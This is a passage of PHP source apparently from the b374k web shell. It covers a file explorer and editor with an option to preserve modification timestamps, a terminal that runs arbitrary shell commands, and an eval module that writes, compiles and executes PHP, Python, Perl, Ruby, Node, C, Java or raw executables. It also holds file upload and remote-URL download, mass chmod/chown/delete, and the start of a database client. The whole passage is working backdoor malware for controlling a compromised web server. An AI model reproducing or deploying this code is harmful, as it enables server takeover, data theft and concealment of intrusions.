} if(!function_exists('view_file')){ function view_file($file, $type, $preserveTimestamp='true'){ $output = ""; if(is_file($file)){ $dir = dirname($file); $owner = ""; if(!is_win()){ $owner = "<tr><td>Owner</td><td>".get_fileowner($file)."</td></tr>"; } $image_info = @getimagesize($file); $mime_list = get_resource('mime'); $mime = ""; $file_ext_pos = strrpos($file, "."); if($file_ext_pos!==false){ $file_ext = trim(substr($file, $file_ext_pos),"."); if(preg_match("/([^\s]+)\ .*\b".$file_ext."\b.*/i", $mime_list, $res)){ $mime = $res[1]; } } if($type=="auto"){ if(is_array($image_info)) $type = 'image'; elseif(!empty($mime)) $type = "multimedia"; else $type = "raw"; } $content = ""; if($type=="code"){ $hl_arr = array( "hl_default"=> ini_get('highlight.default'), "hl_keyword"=> ini_get('highlight.keyword'), "hl_string"=> ini_get('highlight.string'), "hl_html"=> ini_get('highlight.html'), "hl_comment"=> ini_get('highlight.comment') ); $content = highlight_string(read_file($file),true); foreach($hl_arr as $k=>$v){ $content = str_replace("<font color=\"".$v."\">", "<font class='".$k."'>", $content); $content = str_replace("<span style=\"color: ".$v."\">", "<span class='".$k."'>", $content); } } elseif($type=="image"){ $width = (int) $image_info[0]; $height = (int) $image_info[1]; $image_info_h = "Image type = <span class='strong'>(</span> ".$image_info['mime']." <span class='strong'>)</span><br> Image Size = <span class='strong'>( </span>".$width." x ".$height."<span class='strong'> )</span><br>"; if($width > 800){ $width = 800; $imglink = "<p><a id='viewFullsize'> <span class='strong'>[ </span>View Full Size<span class='strong'> ]</span></a></p>"; } else $imglink = ""; $content = "<center>".$image_info_h."<br>".$imglink." <img id='viewImage' style='width:".$width."px;' src='data:".$image_info['mime'].";base64,".base64_encode(read_file($file))."' alt='".$file."'></center> "; } elseif($type=="multimedia"){ $content = "<center> <video controls> <source src='' type='".$mime."'> </video> <p><span class='button' onclick=\"multimedia('".html_safe(addslashes($file))."');\">Load Multimedia File</span></p> </center>"; } elseif($type=="edit"){ $preservecbox = ($preserveTimestamp=='true')? " cBoxSelected":""; $content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_raw();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">".html_safe(read_file($file))."</textarea></td></tr></table>"; } elseif($type=="hex"){ $preservecbox = ($preserveTimestamp=='true')? " cBoxSelected":""; $content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">".bin2hex(read_file($file))."</textarea></td></tr></table>"; } else $content = "<pre>".html_safe(read_file($file))."</pre>"; $output .= " <table id='viewFile' class='boxtbl'> <tr><td style='width:120px;'>Filename</td><td>".html_safe($file)."</td></tr> <tr><td>Size</td><td>".get_filesize($file)." (".filesize($file).")</td></tr> ".$owner." <tr><td>Permission</td><td>".get_fileperms($file)."</td></tr> <tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($file))."</td></tr> <tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($file))."</td></tr> <tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($file))."</td></tr> <tr data-path='".html_safe($file)."'><td colspan='2'> <span class='navigate button' style='width:120px;'>explorer</span> <span class='action button' style='width:120px;'>action</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'raw');hide_box();\">raw</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'code');hide_box();\">code</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'hex');hide_box();\">hex</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'image');hide_box();\">image</span> <span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'multimedia');hide_box();\">multimedia</span> </td></tr> <tr><td colspan='2'><div id='viewFilecontent'>".$content."</div></td></tr> </table>"; } else $output = "error"; return $output; }
} if(!function_exists('get_writabledir')){ function get_writabledir(){ if(is_writable(".")) return realpath(".").DIRECTORY_SEPARATOR; else{ foreach(array('TMP', 'TEMP', 'TMPDIR') as $k){ if(!empty($_ENV[$k])){ if(is_writable($_ENV[$k])) return realpath($_ENV[$k]).DIRECTORY_SEPARATOR; } } if(function_exists("sys_get_temp_dir")){ $dir = sys_get_temp_dir(); if(is_writable($dir)) return realpath($dir).DIRECTORY_SEPARATOR; } else{ if(!is_win()){ if(is_writable("/tmp")) return "/tmp/"; } } $tempfile = tempnam(__FILE__,''); if(file_exists($tempfile)){ $dir = realpath(dirname($tempfile)).DIRECTORY_SEPARATOR; unlink($tempfile); return $dir; } } return false; }
} if(!function_exists('get_drives')){ function get_drives(){ $drives = ""; $v = explode("\\", get_cwd()); $v = $v[0]; foreach (range("A", "Z") as $letter){ if(@is_readable($letter.":\\")){ $drives .= "<a class='navbar' data-path='".$letter.":\\'>[ "; if($letter.":" != $v) $drives .= $letter; else{$drives .= "<span class='drive-letter'>".$letter."</span>";} $drives .= " ]</a> "; } } return $drives; }
} if(!function_exists('show_all_files')){ function show_all_files($path){ if(!is_dir($path)) return "No such directory : ".$path; chdir($path); $output = ""; $allfiles = $allfolders = array(); if($res = opendir($path)){ while($file = readdir($res)){ if(($file!='.')&&($file!="..")){ if(is_dir($file)) $allfolders[] = $file; elseif(is_file($file))$allfiles[] = $file; } } } array_unshift($allfolders, "."); $cur = getcwd(); chdir(".."); if(getcwd()!=$cur) array_unshift($allfolders, ".."); chdir($cur); natcasesort($allfolders); natcasesort($allfiles); $cols = array(); if(is_win()){ $cols = array( "perms"=>"get_fileperms", "modified"=>"get_filemtime" ); } else{ $cols = array( "owner"=>"get_fileowner", "perms"=>"get_fileperms", "modified"=>"get_filemtime" ); } $totalFiles = count($allfiles); $totalFolders = 0; $output .= "<table id='xplTable' class='dataView sortable'><thead>"; $output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='col-name'>name</th><th class='col-size'>size</th>"; foreach($cols as $k=>$v){ $output .= "<th class='col-".$k."'>".$k."</th>"; } $output .= "</tr></thead><tbody>"; foreach($allfolders as $d){ $cboxException = ""; if(($d==".")||($d=="..")){ $action = "actiondot"; $cboxException = " cBoxException"; } else{ $action = "actionfolder"; $totalFolders++; } $output .= " <tr data-path=\"".html_safe(realpath($d).DIRECTORY_SEPARATOR)."\"><td><div class='cBox".$cboxException."'></div></td> <td style='white-space:normal;'><a class='navigate'>[ ".html_safe($d)." ]</a><span class='".$action." floatRight'>action</span></td> <td>DIR</td>"; foreach($cols as $k=>$v){ $sortable = ""; if($k=='modified') $sortable = " title='".filemtime($d)."'"; $output .= "<td".$sortable.">".$v($d)."</td>"; } $output .= "</tr>"; } foreach($allfiles as $f){ $output .= " <tr data-path=\"".html_safe(realpath($f))."\"><td><div class='cBox'></div></td> <td style='white-space:normal;'><a class='view'>".html_safe($f)."</a><span class='action floatRight'>action</span></td> <td title='".filesize($f)."'>".get_filesize($f)."</td>"; foreach($cols as $k=>$v){ $sortable = ""; if($k=='modified') $sortable = " title='".filemtime($f)."'"; $output .= "<td".$sortable.">".$v($f)."</td>"; } $output .= "</tr>"; } $output .= "</tbody><tfoot>"; $colspan = 1 + count($cols); $output .= "<tr><td><div class='cBoxAll'></div></td><td> <select id='massAction' class='colSpan'> <option disabled selected>Action</option> <option>cut</option> <option>copy</option> <option>paste</option> <option>delete</option> <option disabled>------------</option> <option>chmod</option> <option>chown</option> <option>touch</option> <option disabled>------------</option> <option>extract (tar)</option> <option>extract (tar.gz)</option> <option>extract (zip)</option> <option disabled>------------</option> <option>compress (tar)</option> <option>compress (tar.gz)</option> <option>compress (zip)</option> <option disabled>------------</option> </select> </td><td colspan='".$colspan."'></td></tr> <tr><td></td><td colspan='".++$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td></tr> "; $output .= "</tfoot></table>"; return $output; }
} if(!function_exists('eval_get_supported')){ function eval_get_supported(){ $eval_supported = array(); $eval_supported[] = "php"; $check = strtolower(execute("python -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "python"; $check = strtolower(execute("perl -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "perl"; $check = strtolower(execute("ruby -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "ruby"; $check = strtolower(execute("node -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "node"; else{ $check = strtolower(execute("nodejs -h")); if(strpos($check,"usage")!==false) $eval_supported[] = "nodejs"; } $check = strtolower(execute("gcc --help")); if(strpos($check,"usage")!==false) $eval_supported[] = "gcc"; $check = strtolower(execute("java -help")); if(strpos($check,"usage")!==false){ $check = strtolower(execute("javac -help")); if(strpos($check,"usage")!==false) $eval_supported[] = "java"; } return implode(",", $eval_supported); }
} if(!function_exists('eval_go')){ function eval_go($evalType, $evalCode, $evalOptions, $evalArguments){ $res = ""; $output = ""; if($evalOptions!="") $evalOptions = $evalOptions." "; if($evalArguments!="") $evalArguments = " ".$evalArguments; if($evalType=="php"){ ob_start(); eval($evalCode); $res = ob_get_contents(); ob_end_clean(); return $res; } elseif(($evalType=="python")||($evalType=="perl")||($evalType=="ruby")||($evalType=="node")||($evalType=="nodejs")){ $tmpdir = get_writabledir(); chdir($tmpdir); $res .= "Using dir : ".$tmpdir; if(is_writable($tmpdir)){ $res .= " (writable)\n"; $uniq = substr(md5(time()),0,8); $filename = $evalType.$uniq; $path = $filename; $res .= "Temporary file : ".$path; if(write_file($path, $evalCode)){ $res .= " (ok)\n"; $res .= "Setting permissions : 0755"; if(chmod($path, 0755)){ $res .= " (ok)\n"; $cmd = $evalType." ".$evalOptions.$path.$evalArguments; $res .= "Execute : ".$cmd."\n"; $output = execute($cmd); } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$path; if(unlink($path)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; } else $res .= " (not writable)\n"; $res .= "Finished..."; return $res."{[|b374k|]}".$output; } elseif($evalType=="gcc"){ $tmpdir = get_writabledir(); chdir($tmpdir); $res .= "Using dir : ".$tmpdir; if(is_writable($tmpdir)){ $res .= " (writable)\n"; $uniq = substr(md5(time()),0,8); $filename = $evalType.$uniq.".c"; $path = $filename; $res .= "Temporary file : ".$path; if(write_file($path, $evalCode)){ $res .= " (ok)\n"; $ext = (is_win())? ".exe":".out"; $pathres = $filename.$ext; $evalOptions = "-o ".$pathres." ".$evalOptions; $cmd = "gcc ".$evalOptions.$path; $res .= "Compiling : ".$cmd; $res .= execute($cmd); if(is_file($pathres)){ $res .= " (ok)\n"; $res .= "Setting permissions : 0755"; if(chmod($pathres, 0755)){ $res .= " (ok)\n"; $cmd = $pathres.$evalArguments; $res .= "Execute : ".$cmd."\n"; $output = execute($cmd); } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$pathres; if(unlink($pathres)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$path; if(unlink($path)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; } else $res .= " (not writable)\n"; $res .= "Finished..."; return $res."{[|b374k|]}".$output; } elseif($evalType=="java"){ $tmpdir = get_writabledir(); chdir($tmpdir); $res .= "Using dir : ".$tmpdir; if(is_writable($tmpdir)){ $res .= " (writable)\n"; if(preg_match("/class\ ([^{]+){/i",$evalCode, $r)){ $classname = trim($r[1]); $filename = $classname; } else{ $uniq = substr(md5(time()),0,8); $filename = $evalType.$uniq; $evalCode = "class ".$filename." { ".$evalCode . " } "; } $path = $filename.".java"; $res .= "Temporary file : ".$path; if(write_file($path, $evalCode)){ $res .= " (ok)\n"; $cmd = "javac ".$evalOptions.$path; $res .= "Compiling : ".$cmd; $res .= execute($cmd); $pathres = $filename.".class"; if(is_file($pathres)){ $res .= " (ok)\n"; $res .= "Setting permissions : 0755"; if(chmod($pathres, 0755)){ $res .= " (ok)\n"; $cmd = "java ".$filename.$evalArguments; $res .= "Execute : ".$cmd."\n"; $output = execute($cmd); } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$pathres; if(unlink($pathres)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; $res .= "Deleting temporary file : ".$path; if(unlink($path)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; } else $res .= " (not writable)\n"; $res .= "Finished..."; return $res."{[|b374k|]}".$output; } elseif($evalType=="executable"){ $tmpdir = get_writabledir(); chdir($tmpdir); $res .= "Using dir : ".$tmpdir; if(is_writable($tmpdir)){ $res .= " (writable)\n"; $uniq = substr(md5(time()),0,8); $filename = $evalType.$uniq.".exe"; $path = $filename; $res .= "Temporary file : ".$path; if(write_file($path, $evalCode)){ $res .= " (ok)\n"; $cmd = $path.$evalArguments; $res .= "Execute : ".$cmd."\n"; $output = execute($cmd); $res .= "Deleting temporary file : ".$path; if(unlink($path)) $res .= " (ok)\n"; else $res .= " (failed)\n"; } else $res .= " (failed)\n"; } else $res .= " (not writable)\n"; $res .= "Finished..."; return $res."{[|b374k|]}".$output; } return false; }
} if(!function_exists('output')){ function output($str){ $error = @ob_get_contents(); @ob_end_clean(); header("Content-Type: text/plain"); header("Cache-Control: no-cache"); header("Pragma: no-cache"); echo $str; die(); }
}
block_bot();
auth();
chdir(get_cwd());
$nav = get_nav(get_cwd());
$p = array_map("rawurldecode", get_post());
$cwd = html_safe(get_cwd());
$GLOBALS['module'] = array(); $explorer_content = "";
if(isset($p['viewEntry'])){ $path = trim($p['viewEntry']); if(is_file($path)){ $dirname = realpath(dirname($path)).DIRECTORY_SEPARATOR; setcookie("cwd", $dirname); chdir($dirname); $nav = get_nav($dirname); $cwd = html_safe($dirname); $explorer_content = view_file($path, "auto"); } elseif(is_dir($path)){ $path = realpath($path).DIRECTORY_SEPARATOR; setcookie("cwd", $path); chdir($path); $nav = get_nav($path); $cwd = html_safe($path); $explorer_content = show_all_files($path); }
}
else $explorer_content = show_all_files(get_cwd()); $GLOBALS['module']['explorer']['id'] = "explorer";
$GLOBALS['module']['explorer']['title'] = "Explorer";
$GLOBALS['module']['explorer']['js_ontabselected'] = "";
$GLOBALS['module']['explorer']['content'] = $explorer_content; $GLOBALS['module']['terminal']['id'] = "terminal";
$GLOBALS['module']['terminal']['title'] = "Terminal";
$GLOBALS['module']['terminal']['js_ontabselected'] = "
if((!portableMode) && ($('#terminalOutput').html()=='')) $('#terminalInput').focus();";
$GLOBALS['module']['terminal']['content'] = "<pre id='terminalOutput'></pre><table id='terminalPrompt'><tr><td class='colFit'><span id='terminalCwd' class='strong'>".get_cwd()."&gt;</span</td><td id='terminalCommand'><input type='text' id='terminalInput' class='floatLeft' spellcheck='false'></td></tr></table>"; $GLOBALS['module']['eval']['id'] = "eval";
$GLOBALS['module']['eval']['title'] = "Eval";
$GLOBALS['module']['eval']['js_ontabselected'] = "
if((!portableMode) && ($('#evalOutput').html()=='You can also press ctrl+enter to submit')) $('#evalInput').focus();";
$GLOBALS['module']['eval']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='4'><p class='boxtitle'>Eval</p></th></tr>
</thead>
<tbody> <tr><td colspan='4'><textarea id='evalInput' spellcheck='false' style='height:140px;min-height:140px;'></textarea></td></tr> <tr id='evalAdditional'><td colspan='4'> <input type='text' id='evalOptions' value='Options/Switches' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\"> <input type='text' id='evalArguments' value='Arguments' spellcheck='false' onkeydown=\"trap_enter(event, 'eval_go');\"> </td></tr> <tr> <td style='width:144px;'> <select id='evalType'> </select> </td> <td colspan='3'> <span id='evalSubmit' style='width:120px;' class='button' onclick=\"eval_go();\">run</span> </td> </tr> <tr><td colspan='4'><pre id='evalOutput'>You can also press ctrl+enter to submit</pre></td</tr>
</tbody>
</table>
"; $res = "";
if(isset($p['cd'])){ $path = $p['cd']; if(trim($path)=='') $path = dirname(__FILE__); $path = realpath($path); if(is_file($path)) $path = dirname($path); if(is_dir($path)){ chdir($path); $path = $path.DIRECTORY_SEPARATOR; setcookie("cwd", $path); $res = $path."{[|b374k|]}".get_nav($path)."{[|b374k|]}"; if(isset($p['showfiles'])&&($p['showfiles']=='true')){ $res .= show_all_files($path); } } else $res = "error"; output($res);
}
elseif(isset($p['viewFile']) && isset($p['viewType'])){ $path = trim($p['viewFile']); $type = trim($p['viewType']); $preserveTimestamp = trim($p['preserveTimestamp']); if(is_file($path)){ $res = view_file($path, $type, $preserveTimestamp); } else $res = "error"; output($res);
}
elseif(isset($p['renameFile']) && isset($p['renameFileTo'])){ $renameFile = trim($p['renameFile']); $renameFileTo = trim($p['renameFileTo']); if(file_exists($renameFile)){ if(rename($renameFile, $renameFileTo)){ $res = dirname($renameFileTo); } else $res = "error"; } else $res = "error"; output($res);
}
elseif(isset($p['newFolder'])){ $newFolder = trim($p['newFolder']); if(mkdir($newFolder)){ $res = dirname($newFolder); } else $res = "error"; output($res);
}
elseif(isset($p['newFile'])){ $newFile = trim($p['newFile']); if(touch($newFile)){ $res = dirname($newFile); } else $res = "error"; output($res);
}
elseif(isset($p['delete'])){ $path = trim($p['delete']); $dirname = dirname($path); if(is_file($path)){ if(unlink($path)) $res = $dirname; } elseif(is_dir($path)){ if(rmdirs($path)>0) $res = $dirname; } else $res = "error"; if(file_exists($path)) $res = "error"; output($res);
}
elseif(isset($p['editType'])&&isset($p['editFilename'])&&isset($p['editInput'])&&isset($p['preserveTimestamp'])){ $editFilename = trim($p['editFilename']); $editInput = trim($p['editInput']); $editType = trim($p['editType']); $preserveTimestamp = trim($p['preserveTimestamp']); $time = filemtime($editFilename); if($editType=='hex') $editInput = pack("H*" , preg_replace("/\s/","", $editInput)); if(write_file($editFilename, $editInput)){ $res = $editFilename; if($preserveTimestamp=='true') touch($editFilename, $time); } else $res = "error"; output($res);
}
elseif(isset($p['findType'])){ $findType = trim($p['findType']); $findPath = trim($p['findPath']); $findName = trim($p['findName']); $findNameRegex = trim($p['findNameRegex']); $findNameInsensitive = trim($p['findNameInsensitive']); $findContent = trim($p['findContent']); $findContentRegex = trim($p['findContentRegex']); $findContentInsensitive = trim($p['findContentInsensitive']); $findReadable = trim($p['findReadable']); $findWritable = trim($p['findWritable']); $findExecutable = trim($p['findExecutable']); $candidate = get_all_files($findPath); if($findType=='file') $candidate = array_filter($candidate, "is_file"); elseif($findType=='folder') $candidate = array_filter($candidate, "is_dir"); else $res = "error"; foreach($candidate as $k){ if(($findType=="file")||($findType=="folder")){ if(!empty($findName)){ if($findNameRegex=="true"){ $case = ($findNameInsensitive=="true")? "i":""; if(!preg_match("/".$findName."/".$case, basename($k))){ $candidate = array_diff($candidate, array($k)); } } else{ $check = false; if($findNameInsensitive=="true"){ $check = strpos(strtolower(basename($k)), strtolower($findName))===false; } else{ $check = strpos(basename($k), $findName)===false; } if($check){ $candidate = array_diff($candidate, array($k)); } } } } if($findType=="file"){ if(!empty($findContent)){ $content = read_file($k); if($findContentRegex=="true"){ $case = ($findContentInsensitive=="true")? "i":""; if(!preg_match("/".$findContent."/".$case, $content)){ $candidate = array_diff($candidate, array($k)); } } else{ $check = false; if($findContentInsensitive=="true"){ $check = strpos(strtolower($content), strtolower($findContent))===false; } else{ $check = strpos($content, $findContent)===false; } if($check){ $candidate = array_diff($candidate, array($k)); } } } } } foreach($candidate as $k){ if($findReadable=="true"){ if(!is_readable($k)) $candidate = array_diff($candidate, array($k)); } if($findWritable=="true"){ if(!is_writable($k)) $candidate = array_diff($candidate, array($k)); } if($findExecutable=="true"){ if(!is_executable($k)) $candidate = array_diff($candidate, array($k)); } } if(count($candidate)>0){ $res = ""; foreach($candidate as $k){ $res .= "<p><span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($k)."' onclick='view_entry(this);'>".html_safe($k)."</a></p>"; } } else $res = ""; output($res);
}
elseif(isset($p['ulType'])){ $ulSaveTo = trim($p['ulSaveTo']); $ulFilename = trim($p['ulFilename']); if($p['ulType']=='comp'){ $ulFile = $_FILES['ulFile']; if(empty($ulFilename)) $ulFilename = $ulFile['name']; if(is_uploaded_file($ulFile['tmp_name'])){ if(!is_dir($ulSaveTo)) mkdir($ulSaveTo); $newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename; if(move_uploaded_file($ulFile['tmp_name'], $newfile)){ $res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )"; } else $res = "error"; } else $res = "error"; } elseif($p['ulType']=='url'){ $ulFile = trim($p['ulFile']); if(empty($ulFilename)) $ulFilename = basename($ulFile); if(!is_dir($ulSaveTo)) mkdir($ulSaveTo); $newfile = realpath($ulSaveTo).DIRECTORY_SEPARATOR.$ulFilename; if(download($ulFile, $newfile)){ $res = "<span class='strong'>&gt;</span>&nbsp;<a data-path='".html_safe($newfile)."' onclick='view_entry(this);'>".html_safe($newfile)."</a>&nbsp;( 100% )"; } else $res = "error"; } else $res = "error"; output($res);
}
elseif(isset($p['download'])){ $file = trim($p['download']); if(is_file($file)){ header("Content-Type: application/octet-stream"); header('Content-Transfer-Encoding: binary'); header("Content-length: ".filesize($file)); header("Cache-Control: no-cache"); header("Pragma: no-cache"); header("Content-disposition: attachment; filename=\"".basename($file)."\";"); $handler = fopen($file,"rb"); while(!feof($handler)){ print(fread($handler, 1024*8)); @ob_flush(); @flush(); } fclose($handler); die(); }
}
elseif(isset($p['multimedia'])){ $file = trim($p['multimedia']); $mime_list = get_resource('mime'); $mime = ""; $file_ext_pos = strrpos($file, "."); if($file_ext_pos!==false){ $file_ext = trim(substr($file, $file_ext_pos),"."); if(preg_match("/([^\s]+)\ .*\b".$file_ext."\b.*/i", $mime_list, $res)){ $mime = $res[1]; } } if(is_file($file)){ header("Content-Type: ".$mime); header('Content-Transfer-Encoding: binary'); header("Content-length: ".filesize($file)); echo "data:".$mime.";base64,".base64_encode(read_file($file)); die(); }
}
elseif(isset($p['massType'])&&isset($p['massBuffer'])&&isset($p['massPath'])&&isset($p['massValue'])){ $massType = trim($p['massType']); $massBuffer = trim($p['massBuffer']); $massPath = realpath($p['massPath']).DIRECTORY_SEPARATOR; $massValue = trim($p['massValue']); $counter = 0; $massBufferArr = explode("\n", $massBuffer); if(($massType=='tar')||($massType=='targz')||($massType=='zip')){ if(compress($massType, $massValue, $massBufferArr)){ $counter++; return $counter; } } else{ foreach($massBufferArr as $k){ $path = trim($k); if(file_exists($path)){ $preserveTimestamp = filemtime($path); if($massType=='delete'){ if(is_file($path)){ if(unlink($path)) $counter++; } elseif(is_dir($path)){ if(rmdirs($path)>0) $counter++; } } elseif($massType=='cut'){ $dest = $massPath.basename($path); if(rename($path, $dest)){ $counter++; touch($dest, $preserveTimestamp); } } elseif($massType=='copy'){ $dest = $massPath.basename($path); if(is_dir($path)){ if(copys($path, $dest)>0) $counter++; } elseif(is_file($path)){ if(copy($path, $dest)) $counter++; } } elseif(($massType=='untar')||($massType=='untargz')||($massType=='unzip')){ if(decompress($massType, $path, $massValue)){ $counter++; return $counter; } } elseif(!empty($massValue)){ if($massType=='chmod'){ if(chmod($path, octdec($massValue))) $counter++; } elseif($massType=='chown'){ if(chown($path, $massValue)) $counter++; } elseif($massType=='touch'){ if(touch($path, strtotime($massValue))) $counter++; } } } } } if($counter>0) output($counter); output('error');
}
elseif(isset($p['viewFileorFolder'])){ $entry = $p['viewFileorFolder']; if(is_file($entry)) output('file'); elseif(is_dir($entry)) output('folder'); output('error');
}
elseif(isset($p['terminalInput'])){ output(html_safe(execute($p['terminalInput'])));
}
elseif(isset($p['evalInput']) && isset($p['evalType'])){ $evalInput = $p['evalInput']; $evalOptions = (isset($p['evalOptions']))? $p['evalOptions']:""; $evalArguments = (isset($p['evalArguments']))? $p['evalArguments']:""; $evalType = $p['evalType']; error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE); @ini_set('html_errors','0'); @ini_set('display_errors','1'); @ini_set('display_startup_errors','1'); $res = eval_go($evalType, $evalInput, $evalOptions, $evalArguments); if($res===false) $res == "error"; output(html_safe($res));
}
elseif(isset($p['evalGetSupported'])){ $res = eval_get_supported(); output($res);
}
$GLOBALS['module']['convert']['id'] = "convert";
$GLOBALS['module']['convert']['title'] = "Convert";
$GLOBALS['module']['convert']['js_ontabselected'] = "
if((!portableMode) && ($('#decodeResult').children().length==1)) $('#decodeStr').focus();";
$GLOBALS['module']['convert']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Convert</p></th></tr>
</thead>
<tbody> <tr><td colspan='2'><textarea style='height:140px;min-height:140px;' id='decodeStr'></textarea></td></tr> <tr><td colspan='2'><span class='button' onclick='decode_go();'>convert</span></td></tr>
</tbody>
<tfoot id='decodeResult'><tr><td colspan='2'>You can also press ctrl+enter to submit</td></tr></tfoot>
</table>"; if(!function_exists('decode')){ function decode($str){ $res = ""; $length = (int) strlen($str); $res .= decode_line("md5", md5($str), "input"); $res .= decode_line("sha1", sha1($str), "input"); $res .= decode_line("base64 encode", base64_encode($str), "textarea"); $res .= decode_line("base64 decode", base64_decode($str), "textarea"); $res .= decode_line("hex to string", @pack("H*" , $str), "textarea"); $res .= decode_line("string to hex", bin2hex($str), "textarea"); $ascii = ""; for($i=0; $i<$length; $i++){ $ascii .= ord(substr($str,$i,1))." "; } $res .= decode_line("ascii char", trim($ascii), "textarea"); $res .= decode_line("reversed", strrev($str), "textarea"); $res .= decode_line("lowercase", strtolower($str), "textarea"); $res .= decode_line("uppercase", strtoupper($str), "textarea"); $res .= decode_line("urlencode", urlencode($str), "textarea"); $res .= decode_line("urldecode", urldecode($str), "textarea"); $res .= decode_line("rawurlencode", rawurlencode($str), "textarea"); $res .= decode_line("rawurldecode", rawurldecode($str), "textarea"); $res .= decode_line("htmlentities", html_safe($str), "textarea"); if(function_exists('hash_algos')){ $algos = hash_algos(); foreach($algos as $algo){ if(($algo=='md5')||($algo=='sha1')) continue; $res .= decode_line($algo, hash($algo, $str), "input"); } } return $res; }
} if(!function_exists('decode_line')){ function decode_line($type, $result, $inputtype){ $res = "<tr><td class='colFit'>".$type."</td><td>"; if($inputtype=='input'){ $res .= "<input type='text' value='".html_safe($result)."' ondblclick='this.select();'>"; } else{ $res .= "<textarea style='height:80px;min-height:80px;' ondblclick='this.select();'>".html_safe($result)."</textarea>"; } return $res; }
} if(isset($p['decodeStr'])){ $decodeStr = $p['decodeStr']; output(decode($decodeStr));
}
$GLOBALS['module']['database']['id'] = "database";
$GLOBALS['module']['database']['title'] = "Database";
$GLOBALS['module']['database']['js_ontabselected'] = "";
$GLOBALS['module']['database']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='3'><p class='boxtitle'>Connect</p></th></tr>
</thead>
<tbody> <tr class='dbHostRow'><td style='width:144px' class='dbHostLbl'>Host</td><td colspan='2'><input type='text' id='dbHost' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr> <tr class='dbUserRow'><td>Username</td><td colspan='2'><input type='text' id='dbUser' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr> <tr class='dbPassRow'><td>Password</td><td colspan='2'><input type='text' id='dbPass' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr> <tr class='dbPortRow'><td>Port (Optional)</td><td colspan='2'><input type='text' id='dbPort' value='' onkeydown=\"trap_enter(event, 'db_connect');\"></td></tr>
</tbody>
<tfoot> <tr class='dbConnectRow'> <td style='width:144px;'> <select id='dbType'> </select> </td> <td style='width:120px;'><span class='button' onclick=\"db_connect();\">connect</span></td> <td class='dbError'></td> </tr> <tr class='dbQueryRow' style='display:none;'> <td colspan='3'><textarea id='dbQuery' style='min-height:140px;height:140px;'>You can also press ctrl+enter to submit</textarea></td> </tr> <tr class='dbQueryRow' style='display:none;'> <td style='width:120px;'><span class='button' onclick=\"db_run();\">run</span></td> <td style='width:120px;'><span class='button' onclick=\"db_disconnect();\">disconnect</span></td> <td>Separate multiple commands with a semicolon <span class='strong'>(</span> ; <span class='strong'>)</span></td> </tr>
</tfoot>
</table>
<div id='dbBottom' style='display:none;'>
<br>
<table class='border' style='padding:0;'><tr><td id='dbNav' class='colFit borderright' style='vertical-align:top;'></td><td id='dbResult' style='vertical-align:top;'></td></tr></table>
</div>
